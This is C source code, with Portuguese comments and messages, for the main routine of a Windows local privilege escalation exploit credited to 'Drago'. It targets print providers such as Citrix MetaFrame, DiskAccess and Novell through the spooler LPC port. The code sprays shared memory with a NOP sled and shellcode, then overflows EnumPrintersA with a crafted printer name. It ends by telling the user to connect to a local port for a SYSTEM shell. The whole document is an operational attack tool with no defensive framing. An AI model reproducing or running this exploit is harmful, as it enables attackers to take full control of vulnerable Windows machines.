int main(int argc, char* argv[])
{
  
  unsigned char exploit[BOFSIZE];
  unsigned char buffer[REQUIRED_SIZE];
  DWORD dwSizeNeeded,n=0;
  DWORD datalen=REQUIRED_SIZE;
  LARGE_INTEGER dirs;
  HANDLE hProcess;
  DWORD write;
  char *p,i;
  #define lpLocalAddress dirs.LowPart
  #define lpTargetAddress dirs.HighPart

  printf("[+] Exploit universal para provedores de impressão\n");
  printf("[+] Talvez o Citrix metaframe, DiskAccess ou Novel suas versões foram afetadas\n");
  printf("[+] Exploit by Drago\n\n");

  printf("[+] Conectando a porta de spooler LCP \\RPC Control\\spoolss\n");
  

 
  do {
   dirs=ConnectToLPCPort();
   printf("[+] Tente localizar um endereço valido: Encontrados 0x%8.8x após %i tentativas\r",lpTargetAddress,n+1);
   if (lpLocalAddress==0){ 
	 printf("\n[-] Não foi possivel se conectar a porta de spooler LPC\n"); 
    printf("[-] Verifique se o serviço está rodando\n");
	 exit(0);
   }
   i=lpTargetAddress>>24; // & 0xFF000000 == 0
   n++;
   if (n==MAXLOOPS) {
      printf("\n[-] Não é possível localizar um endereço válido após %i tries\n",n);
      printf("[?] Talvez o valor REQUIRED_SIZE deve ajudar. Tente aumenta-lo\n");
      return(0);
   }
  }while (i!=0);
  
  //printf(" (%i tries)\n",n);
  printf("\n");

  printf("[+] Memoria mapeada. Endereço do cliente: 0x%8.8x\n",lpLocalAddress);
  printf("[+] Memoria mapeada. Endereço do servidor: 0x%8.8x\n",lpTargetAddress);

 
  i=(lpTargetAddress<<8)>>24;
  //Preencha tudo com os rets. Eu não ligo pra onde eles estão.
  memset(exploit,i,sizeof(exploit)); 
  exploit[sizeof(exploit)-1]='\0';

  /*
  memset(exploit,'A',sizeof(exploit)-1);
  exploit[262]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess
  exploit[263]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess
  exploit[264]='\0';
  */
  
  printf("[+] Alvejando o endereço de retorno para  : 0x00%2.2X00%2.2X\n",exploit[262],exploit[262]);

  p=(char *)lpLocalAddress;

  memset(&buffer[0],0x90,REQUIRED_SIZE);
  memcpy(&buffer[REQUIRED_SIZE -sizeof(shellcode)-10],shellcode,sizeof(shellcode));
  
  printf("[+] Escrevendo memória compartilhada...\n");
  if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()))!= NULL ) 
  {
    if ( WriteProcessMemory( hProcess, p, &buffer[0], REQUIRED_SIZE, &write )!=0 )
    {
      printf("[+] Ecrever 0x%x bytes \n",write);
      printf("[+] Explorando vulnerabilidade....\n");
      printf("[+] Exploit completo. Agora tente conectar a 127.0.0.1:51477\n");
      printf("[+] e verifique se você é o sistema =)\n");
      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)exploit, 1, NULL, 0, &dwSizeNeeded, &n );
      return(1);
    } else {
       printf("[-] Escrito 0x%x bytes \n",write);

    }
  } 
  printf("[-] Alguma coisa deu errado. Error %i - Boa sorte na proxima\n",GetLastError());
  return(0);
}